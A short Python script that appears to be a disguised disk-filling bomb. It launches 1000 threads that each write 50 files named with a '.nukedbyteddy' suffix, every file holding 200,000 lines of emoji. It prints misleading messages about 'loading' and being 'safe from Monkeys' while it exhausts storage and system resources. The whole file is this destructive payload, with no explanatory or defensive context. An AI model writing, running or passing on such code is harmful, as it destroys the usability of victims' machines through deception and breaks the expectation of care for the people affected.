from concurrent.futures import ThreadPoolExecutor
import uuid

RED = "\033[91m"
GREEN = "\033[92m"
RESET = "\033[0m"

def worker(thread_id):
    for i in range(50):
        filename = f"{uuid.uuid4()}.nukedbyteddy"
        chunk = "👩🏿‍❤️‍💋‍👨🏿\n" * 10000
        repeats = 20

        with open(filename, "w", encoding="utf-8") as f:
            for _ in range(repeats):
                f.write(chunk)
                f.flush()  

print("Just wait some minutes while its loading")
with ThreadPoolExecutor(max_workers=1000) as executor:
    executor.map(worker, range(1000))

print("Now ur safe from Monkeys")
